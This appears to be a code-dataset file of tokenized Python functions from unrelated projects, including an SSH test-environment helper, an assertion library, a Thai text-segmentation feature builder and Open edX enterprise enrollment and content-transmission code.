def env ( ) : ssh = cij . env to dict ( PREFIX , REQUIRED ) if "KEY" in ssh : ssh [ "KEY" ] = cij . util . expand path ( ssh [ "KEY" ] ) if cij . ENV . get ( "SSH PORT" ) is None : cij . ENV [ "SSH PORT" ] = "22" cij . warn ( "cij.ssh.env: SSH PORT was not set, assigned: %r" % ( cij . ENV . get ( "SSH PORT" ) ) ) if cij . ENV . get ( "SSH CMD TIME" ) is None : cij . ENV [ "SSH CMD TIME" ] = "1" cij . warn ( "cij.ssh.env: SSH CMD TIME was not set, assigned: %r" % ( cij . ENV . get ( "SSH CMD TIME" ) ) ) return 0
def wait ( timeout = 300 ) : if env ( ) : cij . err ( "cij.ssh.wait: Invalid SSH environment" ) return 1 timeout backup = cij . ENV . get ( "SSH CMD TIMEOUT" ) try : time start = time . time ( ) cij . ENV [ "SSH CMD TIMEOUT" ] = "3" while True : time current = time . time ( ) if ( time current - time start ) > timeout : cij . err ( "cij.ssh.wait: Timeout" ) return 1 status , , = command ( [ "exit" ] , shell = True , echo = False ) if not status : break cij . info ( "cij.ssh.wait: Time elapsed: %d seconds" % ( time current - time start ) ) finally : if timeout backup is None : del cij . ENV [ "SSH CMD TIMEOUT" ] else : cij . ENV [ "SSH CMD TIMEOUT" ] = timeout backup return 0
def assert that ( val , description = '' ) : global soft ctx if soft ctx : return Assertion Builder ( val , description , 'soft' ) return Assertion Builder ( val , description )
def is equal to ( self , other , * * kwargs ) : if self . check dict like ( self . val , check values = False , return as bool = True ) and self . check dict like ( other , check values = False , return as bool = True ) : if self . dict not equal ( self . val , other , ignore = kwargs . get ( 'ignore' ) , include = kwargs . get ( 'include' ) ) : self . dict err ( self . val , other , ignore = kwargs . get ( 'ignore' ) , include = kwargs . get ( 'include' ) ) else : if self . val != other : self . err ( 'Expected <%s> to be equal to <%s>, but was not.' % ( self . val , other ) ) return self
def is not equal to ( self , other ) : if self . val == other : self . err ( 'Expected <%s> to be not equal to <%s>, but was.' % ( self . val , other ) ) return self
def is same as ( self , other ) : if self . val is not other : self . err ( 'Expected <%s> to be identical to <%s>, but was not.' % ( self . val , other ) ) return self
def is not same as ( self , other ) : if self . val is other : self . err ( 'Expected <%s> to be not identical to <%s>, but was.' % ( self . val , other ) ) return self
def is type of ( self , some type ) : if type ( some type ) is not type and not issubclass ( type ( some type ) , type ) : raise Type Error ( 'given arg must be a type' ) if type ( self . val ) is not some type : if hasattr ( self . val , ' name ' ) : t = self . val . name elif hasattr ( self . val , ' class ' ) : t = self . val . class . name else : t = 'unknown' self . err ( 'Expected <%s:%s> to be of type <%s>, but was not.' % ( self . val , t , some type . name ) ) return self
def is instance of ( self , some class ) : try : if not isinstance ( self . val , some class ) : if hasattr ( self . val , ' name ' ) : t = self . val . name elif hasattr ( self . val , ' class ' ) : t = self . val . class . name else : t = 'unknown' self . err ( 'Expected <%s:%s> to be instance of class <%s>, but was not.' % ( self . val , t , some class . name ) ) except Type Error : raise Type Error ( 'given arg must be a class' ) return self
def is length ( self , length ) : if type ( length ) is not int : raise Type Error ( 'given arg must be an int' ) if length < 0 : raise Value Error ( 'given arg must be a positive int' ) if len ( self . val ) != length : self . err ( 'Expected <%s> to be of length <%d>, but was <%d>.' % ( self . val , length , len ( self . val ) ) ) return self
def contains ( self , * items ) : if len ( items ) == 0 : raise Value Error ( 'one or more args must be given' ) elif len ( items ) == 1 : if items [ 0 ] not in self . val : if self . check dict like ( self . val , return as bool = True ) : self . err ( 'Expected <%s> to contain key <%s>, but did not.' % ( self . val , items [ 0 ] ) ) else : self . err ( 'Expected <%s> to contain item <%s>, but did not.' % ( self . val , items [ 0 ] ) ) else : missing = [ ] for i in items : if i not in self . val : missing . append ( i ) if missing : if self . check dict like ( self . val , return as bool = True ) : self . err ( 'Expected <%s> to contain keys %s, but did not contain key%s %s.' % ( self . val , self . fmt items ( items ) , '' if len ( missing ) == 0 else 's' , self . fmt items ( missing ) ) ) else : self . err ( 'Expected <%s> to contain items %s, but did not contain %s.' % ( self . val , self . fmt items ( items ) , self . fmt items ( missing ) ) ) return self
def does not contain ( self , * items ) : if len ( items ) == 0 : raise Value Error ( 'one or more args must be given' ) elif len ( items ) == 1 : if items [ 0 ] in self . val : self . err ( 'Expected <%s> to not contain item <%s>, but did.' % ( self . val , items [ 0 ] ) ) else : found = [ ] for i in items : if i in self . val : found . append ( i ) if found : self . err ( 'Expected <%s> to not contain items %s, but did contain %s.' % ( self . val , self . fmt items ( items ) , self . fmt items ( found ) ) ) return self
def contains only ( self , * items ) : if len ( items ) == 0 : raise Value Error ( 'one or more args must be given' ) else : extra = [ ] for i in self . val : if i not in items : extra . append ( i ) if extra : self . err ( 'Expected <%s> to contain only %s, but did contain %s.' % ( self . val , self . fmt items ( items ) , self . fmt items ( extra ) ) ) missing = [ ] for i in items : if i not in self . val : missing . append ( i ) if missing : self . err ( 'Expected <%s> to contain only %s, but did not contain %s.' % ( self . val , self . fmt items ( items ) , self . fmt items ( missing ) ) ) return self
def contains sequence ( self , * items ) : if len ( items ) == 0 : raise Value Error ( 'one or more args must be given' ) else : try : for i in xrange ( len ( self . val ) - len ( items ) + 1 ) : for j in xrange ( len ( items ) ) : if self . val [ i + j ] != items [ j ] : break else : return self except Type Error : raise Type Error ( 'val is not iterable' ) self . err ( 'Expected <%s> to contain sequence %s, but did not.' % ( self . val , self . fmt items ( items ) ) )
def contains duplicates ( self ) : try : if len ( self . val ) != len ( set ( self . val ) ) : return self except Type Error : raise Type Error ( 'val is not iterable' ) self . err ( 'Expected <%s> to contain duplicates, but did not.' % self . val )
def does not contain duplicates ( self ) : try : if len ( self . val ) == len ( set ( self . val ) ) : return self except Type Error : raise Type Error ( 'val is not iterable' ) self . err ( 'Expected <%s> to not contain duplicates, but did.' % self . val )
def is empty ( self ) : if len ( self . val ) != 0 : if isinstance ( self . val , str types ) : self . err ( 'Expected <%s> to be empty string, but was not.' % self . val ) else : self . err ( 'Expected <%s> to be empty, but was not.' % self . val ) return self
def is not empty ( self ) : if len ( self . val ) == 0 : if isinstance ( self . val , str types ) : self . err ( 'Expected not empty string, but was empty.' ) else : self . err ( 'Expected not empty, but was empty.' ) return self
def is in ( self , * items ) : if len ( items ) == 0 : raise Value Error ( 'one or more args must be given' ) else : for i in items : if self . val == i : return self self . err ( 'Expected <%s> to be in %s, but was not.' % ( self . val , self . fmt items ( items ) ) )
def is less than ( self , other ) : self . validate compareable ( other ) if self . val >= other : if type ( self . val ) is datetime . datetime : self . err ( 'Expected <%s> to be less than <%s>, but was not.' % ( self . val . strftime ( '%Y-%m-%d %H:%M:%S' ) , other . strftime ( '%Y-%m-%d %H:%M:%S' ) ) ) else : self . err ( 'Expected <%s> to be less than <%s>, but was not.' % ( self . val , other ) ) return self
def is between ( self , low , high ) : val type = type ( self . val ) self . validate between args ( val type , low , high ) if self . val < low or self . val > high : if val type is datetime . datetime : self . err ( 'Expected <%s> to be between <%s> and <%s>, but was not.' % ( self . val . strftime ( '%Y-%m-%d %H:%M:%S' ) , low . strftime ( '%Y-%m-%d %H:%M:%S' ) , high . strftime ( '%Y-%m-%d %H:%M:%S' ) ) ) else : self . err ( 'Expected <%s> to be between <%s> and <%s>, but was not.' % ( self . val , low , high ) ) return self
def is close to ( self , other , tolerance ) : self . validate close to args ( self . val , other , tolerance ) if self . val < ( other - tolerance ) or self . val > ( other + tolerance ) : if type ( self . val ) is datetime . datetime : tolerance seconds = tolerance . days * 86400 + tolerance . seconds + tolerance . microseconds / 1000000 h , rem = divmod ( tolerance seconds , 3600 ) m , s = divmod ( rem , 60 ) self . err ( 'Expected <%s> to be close to <%s> within tolerance <%d:%02d:%02d>, but was not.' % ( self . val . strftime ( '%Y-%m-%d %H:%M:%S' ) , other . strftime ( '%Y-%m-%d %H:%M:%S' ) , h , m , s ) ) else : self . err ( 'Expected <%s> to be close to <%s> within tolerance <%s>, but was not.' % ( self . val , other , tolerance ) ) return self
def is equal to ignoring case ( self , other ) : if not isinstance ( self . val , str types ) : raise Type Error ( 'val is not a string' ) if not isinstance ( other , str types ) : raise Type Error ( 'given arg must be a string' ) if self . val . lower ( ) != other . lower ( ) : self . err ( 'Expected <%s> to be case-insensitive equal to <%s>, but was not.' % ( self . val , other ) ) return self
def contains ignoring case ( self , * items ) : if len ( items ) == 0 : raise Value Error ( 'one or more args must be given' ) if isinstance ( self . val , str types ) : if len ( items ) == 1 : if not isinstance ( items [ 0 ] , str types ) : raise Type Error ( 'given arg must be a string' ) if items [ 0 ] . lower ( ) not in self . val . lower ( ) : self . err ( 'Expected <%s> to case-insensitive contain item <%s>, but did not.' % ( self . val , items [ 0 ] ) ) else : missing = [ ] for i in items : if not isinstance ( i , str types ) : raise Type Error ( 'given args must all be strings' ) if i . lower ( ) not in self . val . lower ( ) : missing . append ( i ) if missing : self . err ( 'Expected <%s> to case-insensitive contain items %s, but did not contain %s.' % ( self . val , self . fmt items ( items ) , self . fmt items ( missing ) ) ) elif isinstance ( self . val , Iterable ) : missing = [ ] for i in items : if not isinstance ( i , str types ) : raise Type Error ( 'given args must all be strings' ) found = False for v in self . val : if not isinstance ( v , str types ) : raise Type Error ( 'val items must all be strings' ) if i . lower ( ) == v . lower ( ) : found = True break if not found : missing . append ( i ) if missing : self . err ( 'Expected <%s> to case-insensitive contain items %s, but did not contain %s.' % ( self . val , self . fmt items ( items ) , self . fmt items ( missing ) ) ) else : raise Type Error ( 'val is not a string or iterable' ) return self
def starts with ( self , prefix ) : if prefix is None : raise Type Error ( 'given prefix arg must not be none' ) if isinstance ( self . val , str types ) : if not isinstance ( prefix , str types ) : raise Type Error ( 'given prefix arg must be a string' ) if len ( prefix ) == 0 : raise Value Error ( 'given prefix arg must not be empty' ) if not self . val . startswith ( prefix ) : self . err ( 'Expected <%s> to start with <%s>, but did not.' % ( self . val , prefix ) ) elif isinstance ( self . val , Iterable ) : if len ( self . val ) == 0 : raise Value Error ( 'val must not be empty' ) first = next ( iter ( self . val ) ) if first != prefix : self . err ( 'Expected %s to start with <%s>, but did not.' % ( self . val , prefix ) ) else : raise Type Error ( 'val is not a string or iterable' ) return self
def ends with ( self , suffix ) : if suffix is None : raise Type Error ( 'given suffix arg must not be none' ) if isinstance ( self . val , str types ) : if not isinstance ( suffix , str types ) : raise Type Error ( 'given suffix arg must be a string' ) if len ( suffix ) == 0 : raise Value Error ( 'given suffix arg must not be empty' ) if not self . val . endswith ( suffix ) : self . err ( 'Expected <%s> to end with <%s>, but did not.' % ( self . val , suffix ) ) elif isinstance ( self . val , Iterable ) : if len ( self . val ) == 0 : raise Value Error ( 'val must not be empty' ) last = None for last in self . val : pass if last != suffix : self . err ( 'Expected %s to end with <%s>, but did not.' % ( self . val , suffix ) ) else : raise Type Error ( 'val is not a string or iterable' ) return self
def matches ( self , pattern ) : if not isinstance ( self . val , str types ) : raise Type Error ( 'val is not a string' ) if not isinstance ( pattern , str types ) : raise Type Error ( 'given pattern arg must be a string' ) if len ( pattern ) == 0 : raise Value Error ( 'given pattern arg must not be empty' ) if re . search ( pattern , self . val ) is None : self . err ( 'Expected <%s> to match pattern <%s>, but did not.' % ( self . val , pattern ) ) return self
def is alpha ( self ) : if not isinstance ( self . val , str types ) : raise Type Error ( 'val is not a string' ) if len ( self . val ) == 0 : raise Value Error ( 'val is empty' ) if not self . val . isalpha ( ) : self . err ( 'Expected <%s> to contain only alphabetic chars, but did not.' % self . val ) return self
def is digit ( self ) : if not isinstance ( self . val , str types ) : raise Type Error ( 'val is not a string' ) if len ( self . val ) == 0 : raise Value Error ( 'val is empty' ) if not self . val . isdigit ( ) : self . err ( 'Expected <%s> to contain only digits, but did not.' % self . val ) return self
def is lower ( self ) : if not isinstance ( self . val , str types ) : raise Type Error ( 'val is not a string' ) if len ( self . val ) == 0 : raise Value Error ( 'val is empty' ) if self . val != self . val . lower ( ) : self . err ( 'Expected <%s> to contain only lowercase chars, but did not.' % self . val ) return self
def is upper ( self ) : if not isinstance ( self . val , str types ) : raise Type Error ( 'val is not a string' ) if len ( self . val ) == 0 : raise Value Error ( 'val is empty' ) if self . val != self . val . upper ( ) : self . err ( 'Expected <%s> to contain only uppercase chars, but did not.' % self . val ) return self
def is unicode ( self ) : if type ( self . val ) is not unicode : self . err ( 'Expected <%s> to be unicode, but was <%s>.' % ( self . val , type ( self . val ) . name ) ) return self
def is subset of ( self , * supersets ) : if not isinstance ( self . val , Iterable ) : raise Type Error ( 'val is not iterable' ) if len ( supersets ) == 0 : raise Value Error ( 'one or more superset args must be given' ) missing = [ ] if hasattr ( self . val , 'keys' ) and callable ( getattr ( self . val , 'keys' ) ) and hasattr ( self . val , ' getitem ' ) : # flatten superset dicts superdict = { } for l , j in enumerate ( supersets ) : self . check dict like ( j , check values = False , name = 'arg #%d' % ( l + 1 ) ) for k in j . keys ( ) : superdict . update ( { k : j [ k ] } ) for i in self . val . keys ( ) : if i not in superdict : missing . append ( { i : self . val [ i ] } ) # bad key elif self . val [ i ] != superdict [ i ] : missing . append ( { i : self . val [ i ] } ) # bad val if missing : self . err ( 'Expected <%s> to be subset of %s, but %s %s missing.' % ( self . val , self . fmt items ( superdict ) , self . fmt items ( missing ) , 'was' if len ( missing ) == 1 else 'were' ) ) else : # flatten supersets superset = set ( ) for j in supersets : try : for k in j : superset . add ( k ) except Exception : superset . add ( j ) for i in self . val : if i not in superset : missing . append ( i ) if missing : self . err ( 'Expected <%s> to be subset of %s, but %s %s missing.' % ( self . val , self . fmt items ( superset ) , self . fmt items ( missing ) , 'was' if len ( missing ) == 1 else 'were' ) ) return self
def contains value ( self , * values ) : self . check dict like ( self . val , check getitem = False ) if len ( values ) == 0 : raise Value Error ( 'one or more value args must be given' ) missing = [ ] for v in values : if v not in self . val . values ( ) : missing . append ( v ) if missing : self . err ( 'Expected <%s> to contain values %s, but did not contain %s.' % ( self . val , self . fmt items ( values ) , self . fmt items ( missing ) ) ) return self
def does not contain value ( self , * values ) : self . check dict like ( self . val , check getitem = False ) if len ( values ) == 0 : raise Value Error ( 'one or more value args must be given' ) else : found = [ ] for v in values : if v in self . val . values ( ) : found . append ( v ) if found : self . err ( 'Expected <%s> to not contain values %s, but did contain %s.' % ( self . val , self . fmt items ( values ) , self . fmt items ( found ) ) ) return self
def contains entry ( self , * args , * * kwargs ) : self . check dict like ( self . val , check values = False ) entries = list ( args ) + [ { k : v } for k , v in kwargs . items ( ) ] if len ( entries ) == 0 : raise Value Error ( 'one or more entry args must be given' ) missing = [ ] for e in entries : if type ( e ) is not dict : raise Type Error ( 'given entry arg must be a dict' ) if len ( e ) != 1 : raise Value Error ( 'given entry args must contain exactly one key-value pair' ) k = next ( iter ( e ) ) if k not in self . val : missing . append ( e ) # bad key elif self . val [ k ] != e [ k ] : missing . append ( e ) # bad val if missing : self . err ( 'Expected <%s> to contain entries %s, but did not contain %s.' % ( self . val , self . fmt items ( entries ) , self . fmt items ( missing ) ) ) return self
def is before ( self , other ) : if type ( self . val ) is not datetime . datetime : raise Type Error ( 'val must be datetime, but was type <%s>' % type ( self . val ) . name ) if type ( other ) is not datetime . datetime : raise Type Error ( 'given arg must be datetime, but was type <%s>' % type ( other ) . name ) if self . val >= other : self . err ( 'Expected <%s> to be before <%s>, but was not.' % ( self . val . strftime ( '%Y-%m-%d %H:%M:%S' ) , other . strftime ( '%Y-%m-%d %H:%M:%S' ) ) ) return self
def exists ( self ) : if not isinstance ( self . val , str types ) : raise Type Error ( 'val is not a path' ) if not os . path . exists ( self . val ) : self . err ( 'Expected <%s> to exist, but was not found.' % self . val ) return self
def is file ( self ) : self . exists ( ) if not os . path . isfile ( self . val ) : self . err ( 'Expected <%s> to be a file, but was not.' % self . val ) return self
def is directory ( self ) : self . exists ( ) if not os . path . isdir ( self . val ) : self . err ( 'Expected <%s> to be a directory, but was not.' % self . val ) return self
def is named ( self , filename ) : self . is file ( ) if not isinstance ( filename , str types ) : raise Type Error ( 'given filename arg must be a path' ) val filename = os . path . basename ( os . path . abspath ( self . val ) ) if val filename != filename : self . err ( 'Expected filename <%s> to be equal to <%s>, but was not.' % ( val filename , filename ) ) return self
def is child of ( self , parent ) : self . is file ( ) if not isinstance ( parent , str types ) : raise Type Error ( 'given parent directory arg must be a path' ) val abspath = os . path . abspath ( self . val ) parent abspath = os . path . abspath ( parent ) if not val abspath . startswith ( parent abspath ) : self . err ( 'Expected file <%s> to be a child of <%s>, but was not.' % ( val abspath , parent abspath ) ) return self
def raises ( self , ex ) : if not callable ( self . val ) : raise Type Error ( 'val must be callable' ) if not issubclass ( ex , Base Exception ) : raise Type Error ( 'given arg must be exception' ) return Assertion Builder ( self . val , self . description , self . kind , ex )
def when called with ( self , * some args , * * some kwargs ) : if not self . expected : raise Type Error ( 'expected exception not set, raises() must be called first' ) try : self . val ( * some args , * * some kwargs ) except Base Exception as e : if issubclass ( type ( e ) , self . expected ) : # chain on with exception message as val return Assertion Builder ( str ( e ) , self . description , self . kind ) else : # got exception, but wrong type, so raise self . err ( 'Expected <%s> to raise <%s> when called with (%s), but raised <%s>.' % ( self . val . name , self . expected . name , self . fmt args kwargs ( * some args , * * some kwargs ) , type ( e ) . name ) ) # didn't fail as expected, so raise self . err ( 'Expected <%s> to raise <%s> when called with (%s).' % ( self . val . name , self . expected . name , self . fmt args kwargs ( * some args , * * some kwargs ) ) )
def err ( self , msg ) : out = '%s%s' % ( '[%s] ' % self . description if len ( self . description ) > 0 else '' , msg ) if self . kind == 'warn' : print ( out ) return self elif self . kind == 'soft' : global soft err soft err . append ( out ) return self else : raise Assertion Error ( out )
def fmt args kwargs ( self , * some args , * * some kwargs ) : if some args : out args = str ( some args ) . lstrip ( '(' ) . rstrip ( ',)' ) if some kwargs : out kwargs = ', ' . join ( [ str ( i ) . lstrip ( '(' ) . rstrip ( ')' ) . replace ( ', ' , ': ' ) for i in [ ( k , some kwargs [ k ] ) for k in sorted ( some kwargs . keys ( ) ) ] ] ) if some args and some kwargs : return out args + ', ' + out kwargs elif some args : return out args elif some kwargs : return out kwargs else : return ''
def evaluate ( best processed path , model ) : x test char , x test type , y test = prepare feature ( best processed path , option = 'test' ) y predict = model . predict ( [ x test char , x test type ] ) y predict = ( y predict . ravel ( ) > 0.5 ) . astype ( int ) f1score = f1 score ( y test , y predict ) precision = precision score ( y test , y predict ) recall = recall score ( y test , y predict ) return f1score , precision , recall
def document frequency ( X ) : if sp . isspmatrix csr ( X ) : return np . bincount ( X . indices , minlength = X . shape [ 1 ] ) return np . diff ( sp . csc matrix ( X , copy = False ) . indptr )
def create feature array ( text , n pad = 21 ) : n = len ( text ) n pad 2 = int ( ( n pad - 1 ) / 2 ) text pad = [ ' ' ] * n pad 2 + [ t for t in text ] + [ ' ' ] * n pad 2 x char , x type = [ ] , [ ] for i in range ( n pad 2 , n pad 2 + n ) : char list = text pad [ i + 1 : i + n pad 2 + 1 ] + list ( reversed ( text pad [ i - n pad 2 : i ] ) ) + [ text pad [ i ] ] char map = [ CHARS MAP . get ( c , 80 ) for c in char list ] char type = [ CHAR TYPES MAP . get ( CHAR TYPE FLATTEN . get ( c , 'o' ) , 4 ) for c in char list ] x char . append ( char map ) x type . append ( char type ) x char = np . array ( x char ) . astype ( float ) x type = np . array ( x type ) . astype ( float ) return x char , x type
def create n gram df ( df , n pad ) : n pad 2 = int ( ( n pad - 1 ) / 2 ) for i in range ( n pad 2 ) : df [ 'char-{}' . format ( i + 1 ) ] = df [ 'char' ] . shift ( i + 1 ) df [ 'type-{}' . format ( i + 1 ) ] = df [ 'type' ] . shift ( i + 1 ) df [ 'char{}' . format ( i + 1 ) ] = df [ 'char' ] . shift ( - i - 1 ) df [ 'type{}' . format ( i + 1 ) ] = df [ 'type' ] . shift ( - i - 1 ) return df [ n pad 2 : - n pad 2 ]
def dictfetchall ( self , cursor ) : columns = [ col [ 0 ] for col in cursor . description ] return [ dict ( zip ( columns , row ) ) for row in cursor . fetchall ( ) ]
def connect ( self ) : if Jwt Builder is None : raise Not Connected To Open Ed X ( "This package must be installed in an Open Ed X environment." ) now = int ( time ( ) ) jwt = Jwt Builder . create jwt for user ( self . user ) self . client = Edx Rest Api Client ( self . API BASE URL , append slash = self . APPEND SLASH , jwt = jwt , ) self . expires at = now + self . expires in
def refresh token ( func ) : @ wraps ( func ) def inner ( self , * args , * * kwargs ) : if self . token expired ( ) : self . connect ( ) return func ( self , * args , * * kwargs ) return inner
def redirect if blocked ( course run ids , user = None , ip address = None , url = None ) : for course run id in course run ids : redirect url = embargo api . redirect if blocked ( Course Key . from string ( course run id ) , user = user , ip address = ip address , url = url ) if redirect url : return redirect url
def get results ( self , identity provider , param name , param value , result field name ) : try : kwargs = { param name : param value } returned = self . client . providers ( identity provider ) . users . get ( * * kwargs ) results = returned . get ( 'results' , [ ] ) except Http Not Found Error : LOGGER . error ( 'username not found for third party provider={provider}, {querystring param}={id}' . format ( provider = identity provider , querystring param = param name , id = param value ) ) results = [ ] for row in results : if row . get ( param name ) == param value : return row . get ( result field name ) return None
def course discovery api client ( user , catalog url ) : if Jwt Builder is None : raise Not Connected To Open Ed X ( ( "To get a Catalog API client, this package must be " "installed in an Open ed X environment." ) ) jwt = Jwt Builder . create jwt for user ( user ) return Edx Rest Api Client ( catalog url , jwt = jwt )
def transmit ( self , payload , * * kwargs ) : items to create , items to update , items to delete , transmission map = self . partition items ( payload ) self . transmit delete ( items to delete ) self . transmit create ( items to create ) self . transmit update ( items to update , transmission map )
def serialize items ( self , channel metadata items ) : return json . dumps ( self . prepare items for transmission ( channel metadata items ) , sort keys = True ) . encode ( 'utf-8' )
def transmit create ( self , channel metadata item map ) : for chunk in chunks ( channel metadata item map , self . enterprise configuration . transmission chunk size ) : serialized chunk = self . serialize items ( list ( chunk . values ( ) ) ) try : self . client . create content metadata ( serialized chunk ) except Client Error as exc : LOGGER . error ( 'Failed to update [%s] content metadata items for integrated channel [%s] [%s]' , len ( chunk ) , self . enterprise configuration . enterprise customer . name , self . enterprise configuration . channel code , ) LOGGER . error ( exc ) else : self . create transmissions ( chunk )
def transmit update ( self , channel metadata item map , transmission map ) : for chunk in chunks ( channel metadata item map , self . enterprise configuration . transmission chunk size ) : serialized chunk = self . serialize items ( list ( chunk . values ( ) ) ) try : self . client . update content metadata ( serialized chunk ) except Client Error as exc : LOGGER . error ( 'Failed to update [%s] content metadata items for integrated channel [%s] [%s]' , len ( chunk ) , self . enterprise configuration . enterprise customer . name , self . enterprise configuration . channel code , ) LOGGER . error ( exc ) else : self . update transmissions ( chunk , transmission map )
def transmit delete ( self , channel metadata item map ) : for chunk in chunks ( channel metadata item map , self . enterprise configuration . transmission chunk size ) : serialized chunk = self . serialize items ( list ( chunk . values ( ) ) ) try : self . client . delete content metadata ( serialized chunk ) except Client Error as exc : LOGGER . error ( 'Failed to delete [%s] content metadata items for integrated channel [%s] [%s]' , len ( chunk ) , self . enterprise configuration . enterprise customer . name , self . enterprise configuration . channel code , ) LOGGER . error ( exc ) else : self . delete transmissions ( chunk . keys ( ) )
def create transmissions ( self , content metadata item map ) : # pylint: disable=invalid-name Content Metadata Item Transmission = apps . get model ( 'integrated channel' , 'Content Metadata Item Transmission' ) transmissions = [ ] for content id , channel metadata in content metadata item map . items ( ) : transmissions . append ( Content Metadata Item Transmission ( enterprise customer = self . enterprise configuration . enterprise customer , integrated channel code = self . enterprise configuration . channel code ( ) , content id = content id , channel metadata = channel metadata ) ) Content Metadata Item Transmission . objects . bulk create ( transmissions )
def update transmissions ( self , content metadata item map , transmission map ) : for content id , channel metadata in content metadata item map . items ( ) : transmission = transmission map [ content id ] transmission . channel metadata = channel metadata transmission . save ( )
def delete transmissions ( self , content metadata item ids ) : # pylint: disable=invalid-name Content Metadata Item Transmission = apps . get model ( 'integrated channel' , 'Content Metadata Item Transmission' ) Content Metadata Item Transmission . objects . filter ( enterprise customer = self . enterprise configuration . enterprise customer , integrated channel code = self . enterprise configuration . channel code ( ) , content id in = content metadata item ids ) . delete ( )
def validate username ( self , value ) : try : user = User . objects . get ( username = value ) except User . Does Not Exist : raise serializers . Validation Error ( "User does not exist" ) try : enterprise customer user = models . Enterprise Customer User . objects . get ( user id = user . pk ) except models . Enterprise Customer User . Does Not Exist : raise serializers . Validation Error ( "User has no Enterprise Customer User" ) self . enterprise customer user = enterprise customer user return value
def save ( self ) : # pylint: disable=arguments-differ course id = self . validated data [ 'course id' ] , created = models . Enterprise Course Enrollment . objects . get or create ( enterprise customer user = self . enterprise customer user , course id = course id , ) if created : track enrollment ( 'rest-api-enrollment' , self . enterprise customer user . user id , course id )
def get groups ( self , obj ) : if obj . user : return [ group . name for group in obj . user . groups . filter ( name in = ENTERPRISE PERMISSION GROUPS ) ] return [ ]
def validate username ( self , value ) : try : self . user = User . objects . get ( username = value ) except User . Does Not Exist : raise serializers . Validation Error ( "User does not exist" ) return value
def save ( self ) : # pylint: disable=arguments-differ enterprise customer = self . validated data [ 'enterprise customer' ] ecu = models . Enterprise Customer User ( user id = self . user . pk , enterprise customer = enterprise customer , ) ecu . save ( )
def create ( self , validated data ) : ret = [ ] for attrs in validated data : if 'non field errors' not in attrs and not any ( isinstance ( attrs [ field ] , list ) for field in attrs ) : ret . append ( self . child . create ( attrs ) ) else : ret . append ( attrs ) return ret
def to representation ( self , data ) : return [ self . child . to representation ( item ) if 'detail' in item else item for item in data ]
def create ( self , validated data ) : enterprise customer = self . context . get ( 'enterprise customer' ) lms user = validated data . get ( 'lms user id' ) tpa user = validated data . get ( 'tpa user id' ) user email = validated data . get ( 'user email' ) course run id = validated data . get ( 'course run id' ) course mode = validated data . get ( 'course mode' ) cohort = validated data . get ( 'cohort' ) email students = validated data . get ( 'email students' ) is active = validated data . get ( 'is active' ) enterprise customer user = lms user or tpa user or user email if isinstance ( enterprise customer user , models . Enterprise Customer User ) : validated data [ 'enterprise customer user' ] = enterprise customer user try : if is active : enterprise customer user . enroll ( course run id , course mode , cohort = cohort ) else : enterprise customer user . unenroll ( course run id ) except ( Course Enrollment Downgrade Error , Course Enrollment Permission Error , Http Client Error ) as exc : validated data [ 'detail' ] = str ( exc ) return validated data if is active : track enrollment ( 'enterprise-customer-enrollment-api' , enterprise customer user . user id , course run id ) else : if is active : enterprise customer user = enterprise customer . enroll user pending registration ( user email , course mode , course run id , cohort = cohort ) else : enterprise customer . clear pending registration ( user email , course run id ) if email students : enterprise customer . notify enrolled learners ( self . context . get ( 'request user' ) , course run id , [ enterprise customer user ] ) validated data [ 'detail' ] = 'success' return validated data
def validate lms user id ( self , value ) : enterprise customer = self . context . get ( 'enterprise customer' ) try : # Ensure the given user is associated with the enterprise. return models . Enterprise Customer User . objects . get ( user id = value , enterprise customer = enterprise customer ) except models . Enterprise Customer User . Does Not Exist : pass return None
def validate course run id ( self , value ) : enterprise customer = self . context . get ( 'enterprise customer' ) if not enterprise customer . catalog contains course ( value ) : raise serializers . Validation Error ( 'The course run id {course run id} is not in the catalog ' 'for Enterprise Customer {enterprise customer}' . format ( course run id = value , enterprise customer = enterprise customer . name , ) ) return value
def validate ( self , data ) : # pylint: disable=arguments-differ lms user id = data . get ( 'lms user id' ) tpa user id = data . get ( 'tpa user id' ) user email = data . get ( 'user email' ) if not lms user id and not tpa user id and not user email : raise serializers . Validation Error ( 'At least one of the following fields must be specified and map to an Enterprise Customer User: ' 'lms user id, tpa user id, user email' ) return data
def create switch ( apps , schema editor ) : Switch = apps . get model ( 'waffle' , 'Switch' ) Switch . objects . update or create ( name = ENTERPRISE ROLE BASED ACCESS CONTROL SWITCH , defaults = { 'active' : False } )
def delete switch ( apps , schema editor ) : Switch = apps . get model ( 'waffle' , 'Switch' ) Switch . objects . filter ( name = ENTERPRISE ROLE BASED ACCESS CONTROL SWITCH ) . delete ( )
def create switch ( apps , schema editor ) : Switch = apps . get model ( 'waffle' , 'Switch' ) Switch . objects . get or create ( name = 'SAP USE ENTERPRISE ENROLLMENT PAGE' , defaults = { 'active' : False } )
def handle transmission error ( self , learner data , request exception ) : try : sys msg = request exception . response . content except Attribute Error : pass else : if 'user account is inactive' in sys msg : ecu = Enterprise Customer User . objects . get ( enterprise enrollments id = learner data . enterprise course enrollment id ) ecu . active = False ecu . save ( ) LOGGER . warning ( 'User %s with ID %s and email %s is a former employee of %s ' 'and has been marked inactive in SAPSF. Now marking inactive internally.' , ecu . username , ecu . user id , ecu . user email , ecu . enterprise customer ) return super ( Sap Success Factors Learner Transmitter , self ) . handle transmission error ( learner data , request exception )
def update throttle scope ( self ) : self . scope = SERVICE USER SCOPE self . rate = self . get rate ( ) self . num requests , self . duration = self . parse rate ( self . rate )
def get learner data records ( self , enterprise enrollment , completed date = None , grade = None , is passing = False ) : # pylint: disable=invalid-name Learner Data Transmission Audit = apps . get model ( 'integrated channel' , 'Learner Data Transmission Audit' ) completed timestamp = None course completed = False if completed date is not None : completed timestamp = parse datetime to epoch millis ( completed date ) course completed = is passing return [ Learner Data Transmission Audit ( enterprise course enrollment id = enterprise enrollment . id , course id = enterprise enrollment . course id , course completed = course completed , completed timestamp = completed timestamp , grade = grade , ) ]
